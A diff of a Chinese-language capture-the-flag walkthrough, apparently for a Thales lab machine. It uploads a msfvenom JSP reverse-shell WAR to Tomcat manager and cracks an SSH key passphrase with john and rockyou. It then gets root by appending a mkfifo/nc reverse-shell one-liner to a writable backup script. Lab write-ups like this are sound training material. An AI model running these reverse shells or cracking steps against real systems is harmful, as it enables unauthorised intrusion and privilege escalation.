@@ -65,12 +65,61 @@ exploit
 ```
 tomcat;role1
 
-## 2.2 二次侦测
-同时发现URL变成
-`http://192.168.203.137:8080/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=235AF448BA0775F541151133DEBA7133`
-获得CSRF_NONCE
 ## 2.2 反弹shell
 ![](images/1.png "可以上传文件")
-`msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.11.129 LPORT=1234 -f war -o revshell.war`
+
+`msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.203.129 LPORT=7777 -f war -o revshell.war`
+
 ![](images/2.png "点击启动")
-成功反弹shell
+
+成功反弹shell，接着升级shell界面，见[kali linux基操 4.3 升级shell界面]({{< relref "/docs/cybersecurity/kali_linux基操/index.md#43-升级shell界面" >}})
+
+## 2.3 shell中获取信息（难）
+sudo权限分析：`sudo -l`，但密码不对，因此不用这个思路
+
+`/home/thales`中发现两个`txt`文件，其中`user.txt`密码对不上
+`notes.txt`:
+```
+I prepared a backup script for you. The script is in this directory "/usr/local/bin/backup.sh". Good Luck.
+```
+
+得到关键文件，`/usr/local/bin/backup.sh`内容如图，其具备读写执行的权限
+
+![](images/3.png "备份脚本")
+![](images/6.png "backup.sh文件权限")
+同时发现隐藏文件夹，其中`.ssh`含有私钥
+
+![](images/4.png "thales中隐藏文件夹")
+
+私钥信息如下：
+
+![](images/5.png "私钥信息")
+
+## 2.4 ssh私钥密码破解
+把`id_rsa`和`id_rsa.pub`放到kali的thales文件夹中，接着用`ssh2john.py`脚本编译
+```
+/usr/share/john/ssh2john.py id_rsa > crack.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
+```
+
+爆破获得密码：vodka06
+
+`su thales`切换用户到thales，使用上述密码，接着可以看到user.txt的内容`a837c0b5d2a8a07225fd9905f5a0e9c4`，应该用md5解码，但要付钱，所以先不管
+
+## 2.5 backup.sh文件利用（难）
+在文件中增加反弹shell
+```zsh
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.203.129 6666 >/tmp/f" >> backup.sh
+
+nc -lvvp 6666
+```
+原理见见[kali linux基操 4.1.6 利用有权限的文件反弹shell]({{< relref "/docs/cybersecurity/kali_linux基操/index.md#416-利用有权限的文件反弹shell" >}})
+等一会获得root权限，获得root:`3a1c85bebf8833b0ecae900fb8598b17`
+
+# 三、总结
+这里的两步反弹shell，第一步看到浏览器的靶机网页中上传文件是能想到，但第二步再次利用有权限的文件反弹shell却是没有想到，这里最关键的是两个命令
+```ZSH
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.203.129 LPORT=7777 -f war -o revshell.war
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.203.129 6666 >/tmp/f" >> backup.sh
+```
